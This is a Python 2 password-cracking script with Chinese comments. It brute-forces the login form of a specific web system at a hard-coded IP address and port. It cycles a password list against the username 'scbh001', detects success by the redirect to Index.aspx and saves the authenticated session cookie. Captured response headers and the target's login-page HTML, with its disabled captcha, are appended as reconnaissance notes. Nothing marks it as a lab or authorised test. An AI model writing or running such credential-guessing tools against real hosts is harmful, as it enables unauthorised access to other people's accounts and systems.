#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_bzqpbs.py
"""
需要增加1：从文本文件中读取密码，并用一个文件来保存当前读取到的位置，
下一次可以判断有无记录位置的文件，作为进度保存。
20130715-2030 通过在Firefox的HttpFox中发现在访问http://220.166.21.41:8189中登录时，PBS好像是用的ajax进行POST提交验证数据的？？？具体内容在本文尾？？？

"""
import urllib
import urllib2
import cookielib
import httplib
import time

class Auth_Cookie():
    def __init__(self, url, cookie_file, user_agent, username):
        """
        url ==> url to test
        cookie_file ==> file of save cookie
        user_agent ==> http client agent
        """
        client_headers = {'User-Agent':user_agent}
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        self.req = urllib2.Request(url, client_headers)
        self.user_crack = username
    def crack(self, pwd_list):
        """
        pwd_list ==> ['111', '222', .....]
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)      """
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({'userName':self.user_crack,
                                           'passWord':key1,
                                           'login':'true',
                                           'validCode':''})
            try:
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR"
                return
            response_resu = response.getcode()
            """print "result:",type(response_resu),response_resu"""
            if response_resu == 200:
                response_html = response.read()
                """"""
                print response_html
                """
                print type(response_html)
                return response_html
                """
                case = response_html.find('Index.aspx')
                if case == -1:
                    print "false.....", key1
                else:
                    print "find the key:", key1
                    self.cookiejar.save()
                    return response
   
        return "error"
"""
>> aaa1.headers.values()
['39', '4.0.30319', 'ASP.NET_SessionId=r4zfwuvtfji5gmkwkht2vszg; path=/; HttpOnly', 'ASP.NET', 'Microsoft-IIS/7.5', 'close
', 'private', 'Mon, 30 Sep 2013 13:05:08 GMT', 'text/html; charset=utf-8']

>>> aaa1.headers.values()
['39', '4.0.30319', 'ASP.NET_SessionId=ynuzf2wkehrkffgn1x0u4tze; path=/; HttpOnly', 'ASP.NET', 'Microsoft-IIS/7.5', 'close
', 'private', 'Mon, 30 Sep 2013 13:05:08 GMT', 'text/html; charset=utf-8']
"""

if __name__ == "__main__":
    url11 = "http://220.166.21.41:8189/Default.aspx"
    file11 = "/tmp/cookie11.txt"
    agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
    dict11 = {'a1':'sss', 'a2':'dddd', 'username':'scbh001',}
    pwd11 = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001']
    aaa1 = ""
    s11 = Auth_Cookie(url11, file11, agent11, 'scbh001')
    s11.crack(pwd11)

def test():
    global aaa1
    s11 = Auth_Cookie(url11, file11, agent11, 'scbh001')
    aaa1 = s11.crack(pwd11)

"""auth at firefox with HttpFox:


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1"><title>

</title><link href="Resource/Css/style.css" rel="stylesheet" type="text/css" />
    <script src="Resource/Js/jquery-1.7.1.min.js" type="text/javascript"></script>
    <script src="Resource/Js/function.js" type="text/javascript"></script>
    <style type="text/css">
        table{empty-cells: show; border-collapse: collapse;}
    </style>
    <script type="text/javascript">
        $(function () {
            $(document).keydown(function (e) {
                var ev = document.all ? window.event : e;
                if (ev.keyCode == 13) {
                    $("#loginsubmit").click();
                }
            });

            function builderValidCodeFn() {
                var num = Math.random();
                $("#imgValidCode").attr("src", "ValidCodeBuilder.ashx?rand=" + num);
            }
            $("#imgValidCode").click(builderValidCodeFn);

            $("#loginsubmit").click(function loginFn() {
                var userName = $("#txtUserName").val();
                var passWord = $("#txtUserPwd").val();
                var validCode = $("#txtValid").val();
                if (userName == "") {
                    $(".tipbox").html("提示：请输入用户名！");
                    return false;
                }
                if (passWord == "") {
                    $(".tipbox").html("提示：请输入密码！");
                    return false;
                }
                //                if (validCode == "") {
                //                    $(".tipbox").html("提示：请输入验证码！");
                //                    return false;
                //                }
                if (checkString(userName)) {
                    $(".tipbox").html("提示：用户名有非法字符！");
                    return false;
                }
                if (checkString(validCode)) {
                    $(".tipbox").html("提示：验证码有非法字符！");
                    return false;
                }

                var ajaxData = "login=true&userName=" + userName + "&passWord=" + passWord + "&validCode=" + validCode;
                $.ajax({ url: "Default.aspx", data: ajaxData, cache: false, type: "POST",
                    success: function (data) {
                        data = $.parseJSON(data);
                        if (data.Result) {
                            window.location.href = data.Message;
                        } else {
//                            builderValidCodeFn();
                            $(".tipbox").html("提示：" + data.Message);
                            $("#txtValid").val("");
                        }
                    }
                });
            });

            $("#txtUserName").focus();
            position_fixed(document.getElementById('ie6-warning'), 0, 0); //IE6浏览器提示
        });
    </script>
</head>
<body>
    <form method="post" action="" id="form1">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTIwNjAyODU4M2Rk1BLAQRCVPQGKXGbn2k/5DF1CrT2Q6ZHCM9I4KYK/hpY=" />
</div>

    <!--[if lte IE 6]>
    <div id='ie6-warning'> 友情提示：您正在使用速度慢、风险高的<span style='color:Red'>IE6</span>，在本系统的显示效果可能有差异。建议您升级到<span style='color:Red'>IE8.0</span>或较新版本浏览器。
    </div>
    <![endif]-->
    <div id="login_body">
        <div id="login_div">
            <div id="login_form_div">
                <table border="0" width="300px">
                    <tbody>
                        <tr>
                            <td style="width: 180px">
                                <table style="width: 100%; height: 100%; margin-top: 25px;">
                                    <tr>
                                        <td>
                                            用户名：
                                        </td>
                                        <td>
                                            <input type="text" id="txtUserName" class="login_input" />
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            密&nbsp;&nbsp;码：
                                        </td>
                                        <td>
                                            <input type="password" id="txtUserPwd" class="login_input" />
                                        </td>
                                    </tr>
                                    <tr style="display: none">
                                        <td>
                                            验证码：
                                        </td>
                                        <td>
                                            <input type="text" id="txtValid" style="width: 60px" class="login_input" />
                                            <img id="imgValidCode" src="ValidCodeBuilder.ashx" style="cursor: pointer;" alt="验证码" />
                                        </td>
                                    </tr>
                                </table>
                            </td>
                            <td align="left">
                                <img id="loginsubmit" alt="登录" class="login_btn" src="Resource/Images/login_btn.gif" />
                            </td>
                        </tr>
                        <tr>
                            <td colspan="2" class="tipbox" style="background: url(Resource/Images/hint.gif) 0 6px no-repeat;
                                padding-left: 15px;">
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <div id="login_footer">
            当前版本：V10.00   鹏博 © 2010 - 2013 szmmt.com Inc.</div>
    </div>
    </form>
</body>
</html>
"""
